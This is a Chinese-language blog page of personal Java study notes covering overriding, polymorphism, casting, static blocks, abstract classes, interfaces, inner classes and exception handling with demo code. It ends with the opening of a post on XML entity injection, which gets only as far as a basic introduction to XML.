<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.A;</span><br><span class="line"><span class="keyword">import</span> com.oop.Demo05.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//方法的调用之和左边，定义的数据类型</span></span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.test();<span class="comment">//A</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//父类的引用指向了子类</span></span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        b.test();<span class="comment">//B</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span><span class="comment">//重写   注解：有功能的注释</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.Demo05;</span><br><span class="line"><span class="comment">//重写是方法的重写，与属性无关</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>重写:需要有继承关系，子类重写父类的方法!<br>1．方法名必须相同<br>2. 参数列表列表必须相同<br>3．修饰符:范围可以扩大但不能缩小:public&gt;Protected&gt;Default&gt;private<br>4．抛出的异常:范围，可以被缩小，但不能扩大: classNotFoundException –&gt; Exception(大)<br>重写，子类的方法和父类必要一致:;方法体不同!<br>为什么需要重写:<br>1.父类的功能，子类不一定需要，或者不一定满足!</p>

        <h4 id="多态">
          <a href="#多态" class="heading-link"><i class="fas fa-link"></i></a><a href="#多态" class="headerlink" title="多态"></a>多态</h4>
      <p>即同一个方法可以根据发送对象的不同而采用不同的行为方式</p>
<p>一个对象的实际类型是确定的，但可以指向对象的引用类型有很多</p>
<p>多态存在的条件：</p>
<p>有继承关系</p>
<p>子类重写父类方法</p>
<p>父类引用指向子类的对象</p>
<p>子类重写了父类的方法，输出父类</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165142028.png"></p>
<p>子类的set方法，父类却没法调用</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829165424266.png"></p>
<p>对象能执行那些方法，要看对象左边的类型，右边关系不大</p>
<p>Student能调用的方法，只能是自己的或者继承来的</p>
<p>父类Person呢，可以调用自己的方法，没法调用子类独有的方法</p>
<p>强制类型转换</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829170805535.png"></p>
<p>注意：1.多态是方法的多态，属性没有多态性</p>
<p>2.父类和子类：有联系，类型转换异常 ClaCastExeption</p>
<p>3.存在条件：继承关系，方法需要重写，父类引用指向子类对象  father发 &#x3D;new son()</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.oop.Demo06.Person;</span><br><span class="line">import com.oop.Demo06.Student;</span><br><span class="line">import com.oop.Demo06.teacher;</span><br><span class="line"></span><br><span class="line">public class Application &#123;</span><br><span class="line">    public static   void main(String[] args) &#123;</span><br><span class="line">        //object&gt;String</span><br><span class="line">        //object&gt;person&gt;teacher</span><br><span class="line">        //object&gt;person&gt;student</span><br><span class="line"></span><br><span class="line">     Object a1 = new Student();</span><br><span class="line"></span><br><span class="line">        System.out.println(a1 instanceof Student);</span><br><span class="line">        System.out.println(a1 instanceof Person);</span><br><span class="line">        System.out.println(a1 instanceof Object);</span><br><span class="line">        System.out.println(a1 instanceof String);</span><br><span class="line">        System.out.println(a1 instanceof teacher);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不能重写：static 方法 属于类 不能实例</p>
<p>final 常量</p>
<p>private 私有</p>
<p>instanceof</p>

        <h4 id="instance-of和类型转换">
          <a href="#instance-of和类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#instance-of和类型转换" class="headerlink" title="instance of和类型转换"></a>instance of和类型转换</h4>
      <p>instance of可以判断两个类是否存在父子关系</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172015598.png"></p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829172723738.png"></p>
<p>()+要转的对象，alt+回车  </p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">obj</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student student= (Student) obj;</span><br><span class="line">        student.go();</span><br></pre></td></tr></table></div></figure>

<p>这是低转高的类型，转换没有大问题，子类向父类转换，向上转型</p>
<p>高转低</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student student= <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.go();</span><br><span class="line">        Person person=student;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>父类转子类会丢失一部分东西，强制转换</p>
<p>父类引用指向子类对象：向上转型 隐式转换 可能会丢失子类特有的方法 父类引用的变量无法使用子类特有的方法 如果父类引用变量需要使用子类特有的方法，此时需要将该父类引用变量显示转换为子类引用</p>

        <h4 id="static详解">
          <a href="#static详解" class="heading-link"><i class="fas fa-link"></i></a><a href="#static详解" class="headerlink" title="static详解"></a>static详解</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//代码块（匿名代码块）创建对象时就生成，对象生成一次就加载一次</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static&#123;</span><br><span class="line">//静态代码块（匿名代码块）根类一块加载，就加载一次，永久存在</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package com.oop.Demo07;</span><br><span class="line"></span><br><span class="line">public class demo01 &#123;</span><br><span class="line">    //2.赋初值</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;匿名代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //1只执行一次</span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot;静态代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">//3.</span><br><span class="line">    public demo01() &#123;</span><br><span class="line">        System.out.println(&quot;构造方法&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] arga)&#123;</span><br><span class="line">        demo01 a1 = new demo01();</span><br><span class="line">        System.out.println(&quot;------&quot;);</span><br><span class="line">        demo01 a2 = new demo01();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829200221714.png"></p>
<p>静态导入包  :  import static java.lang.Math.random;</p>

        <h4 id="抽象类">
          <a href="#抽象类" class="heading-link"><i class="fas fa-link"></i></a><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4>
      <p>abstract修饰符可以用来修饰方法也可以修饰类,如果修饰方法,那么该方法就是抽象方法;如果修饰类,那么该类就是抽象类。<br>抽象类中可以没有抽象方法,但是有抽象方法的类一定要声明为抽象类。<br>抽象类,不能使用new关键字来创建对象,它是用来让子类继承的。抽象方法,只有方法的声明,没有方法的实现,它是用来让子类实现的。<br>子类继承抽象类,那么就必须要实现抽象类没有实现的抽象方法,否则该子类也要声明为抽象类。</p>
<p>抽象类：</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202236686.png"></p>
<p>抽象类的所有方法，继承了他的子类，都必须实现要实现他的方法</p>
<p>抽象方法：只有方法的名字，没有方法的实现</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202310818.png"></p>
<p>不能new抽象类，只能靠子类去实现他</p>
<p>抽象类可以卸载普通方法里</p>
<p>抽象方法必须在抽象类中</p>
<p>抽象的抽象：约束</p>

        <h4 id="接口的定义与实现">
          <a href="#接口的定义与实现" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口的定义与实现" class="headerlink" title="接口的定义与实现"></a>接口的定义与实现</h4>
      <p>普通类:只有具体实现<br>抽象类:具体实现和规范(抽象方法)都有!</p>
<p>接口:只有规范!自己无法写方法  专业的约束 约束和实现的分离：面接口编程<br>接口就是规范，定义的是一组规则，体现了现实世界中“如果你是…则必须能…”的思想。如果你是天使，则必须能飞。如果你是汽车，则必须能跑。如果你好人，则必须干掉坏人;如果你是坏人，则必须欺负好人。</p>
<p><strong>接口的本质是契约</strong>，就像我们人间的法律一样。制定好后大家都遵守。<br>OO的精髓，是对对象的抽象，最能体现这一点的就是接口。为什么我们讨论设计模式都只针对具备了抽象能力的语言（比如c++、java、c#等)，就是因为设计模式所研究的，实际上就是如何合理的去抽象。<br>声明类的关键字是class,声明接口的关键字是interface</p>
<p>作用:</p>
<p>1．约束<br>2．定义一些方法，让不同的人实现~10—&gt;1</p>
<ol start="3">
<li><p>public abstract</p>
</li>
<li><p>public static final<br>5。接口不能被实例化心，接口中没有构造方法<del>6. implements可以实现多个接口<br>7.必须要重写接口中的方法</del></p>
</li>
</ol>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">interface</span> <span class="title class_">Userservice</span>  &#123;</span><br><span class="line">    <span class="comment">//接口中所有的定义其实都是抽象的 public abstract</span></span><br><span class="line">     <span class="type">int</span> age=<span class="number">999</span>;</span><br><span class="line">     <span class="comment">//常量  public static final</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象类  extends</span></span><br><span class="line"><span class="comment">//类 可以实现接口 implements 接口</span></span><br><span class="line"><span class="comment">//实现了接口的类  就需要重写接口中的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用接口实现多继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserserviceImpl</span> <span class="keyword">implements</span> <span class="title class_">Userservice</span>,Timeservice&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Timeservice</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h4 id="内部类">
          <a href="#内部类" class="heading-link"><i class="fas fa-link"></i></a><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4>
      <p>内部类就是在一个类的内部在定义一个类，比如，A类中定义一个B类，那么B类相对A类来说就称为内部类，而A类相对B类来说就是外部类了。<br>1.成员内部类<br>⒉静态内部类3.局部内部类4.匿名内部类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo010;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是外部类的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">in</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是内部类的方法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo010.Outer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        <span class="comment">//通过外部类来实现内部类</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        inner.in();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>一个java类中可以有多个class类，但是只能有一个public class类</p>
<p>局部内部类</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831131531538.png"></p>

        <h3 id="异常机制">
          <a href="#异常机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h3>
      <p>Error<br>Error类对象由Java虚拟机生成并抛出√大多数错误与代码编写者所执行的操作无关。<br>Java虚拟机运行错误(Virtual MachineError)，当JVM不再有继续执行操作所需的内存资源时，将出现OutOfMemoryError。这些异常发生时，Java虚拟机(JVM)一般会选择线程终止;<br>还有发生在虚拟机试图执行应用时，如类定义错误(NoClassDefFoundError)、链接错误(LinkageError)。这些错误是不可查的，因为它们在应用程序的控制和处理能力之外，而且绝大多数是程序运行时不允许出现的状况。</p>
<p>Exception一<br>在Exception分支中有一个重要的子类RuntimeException(运行时异常)<br>ArraylndexOutOfBoundsException(数组下标越界)—NullPointerException(空指针异常)<br>ArithmeticException(算术异常)<br>MissingResourceException(丢失资源)<br>ClassNotFoundException(找不到类)等异常，这些异常是不检查异常，程序中可以选择捕获处理，也可以不处理。<br>这些异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生;<br>Error和Exception的区别: Error通常是灾难性的致命的错误，是程序无法控制和处理的，当出现这些异常时，Java虚拟机(JVM)一般会选择终止线程;Exception通常情况下是可以被程序处理时，开且仕程序甲应该尽可能的云处理这些异吊。</p>
<p>异常处理的两个机制：</p>
<p>抛出异常  捕获异常</p>
<p>异常处理的五个关键字</p>
<p>：try,catch,finally,throw,throws</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(a/b);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;程序出现异常，变量b不能为0&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>try监控区域  catch 捕获环境  finally  处理善后工作</p>
<p>try  catch必须有，finally可以我没有</p>
<p>Ctrl+Alt+T自动包裹</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831152224452.png"></p>
<p>错误异常分类</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154143492.png"></p>
<p>主动抛出异常</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154326072.png"></p>
<p>一般在方法中使用，在这个方法中处理不了，可以主动抛出</p>
<p>####自定义异常</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//可能存在异常的的方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">throws</span> myException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;传递的参数为&quot;</span>+a);</span><br><span class="line">        <span class="keyword">if</span>(a&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">myException</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test(<span class="number">111</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (myException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Myexception=》&quot;</span>+e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">Xml实体注入漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>#Xml实体注入漏洞</p>
<p>##xml介绍</p>
<p>###什么是 XML?</p>
<ul>
<li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li>
<li>XML 是一种<em>标记语言</em>，很类似 HTML</li>
<li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li>
<li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li>
<li>XML 被设计为具有<em>自我描述性</em>。</li>
<li>XML 是 <em>W3C 的推荐标准</em></li>
</ul>
<p>###XML 与 HTML 的主要差异</p>
<p>XML 不是 HTML 的替代。</p>
<p>XML 和 HTML 为不同的目的而设计：</p>
<p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
<p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
<p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>

        <h3 id="没有任何行为的-XML">
          <a href="#没有任何行为的-XML" class="heading-link"><i class="fas fa-link"></i></a><a href="#没有任何行为的-XML" class="headerlink" title="没有任何行为的 XML"></a>没有任何行为的 XML</h3>
      <p><strong>XML 是不作为的。</strong></p>
<p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
<p><strong>XML 被设计用来传输和存储数据。</strong></p>
